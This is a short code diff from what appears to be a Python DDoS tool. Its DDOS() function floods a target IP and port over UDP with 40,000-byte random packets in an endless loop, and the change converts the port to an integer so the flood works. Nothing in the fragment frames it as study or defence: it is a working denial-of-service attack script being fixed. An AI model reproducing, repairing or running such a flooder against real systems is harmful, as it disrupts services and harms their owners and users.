@@ -157,7 +157,7 @@ def DDOS():
     sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)#.sendto(byte())
     try:
         while True:    
-            send=sock.sendto(random._urandom(40000),(ip,port))
+            send=sock.sendto(random._urandom(40000),(ip,int(port)))
             print(f' [+] send packet to {ip}:{port}')
     except KeyboardInterrupt:
        input(' [+] press enter to exit...')
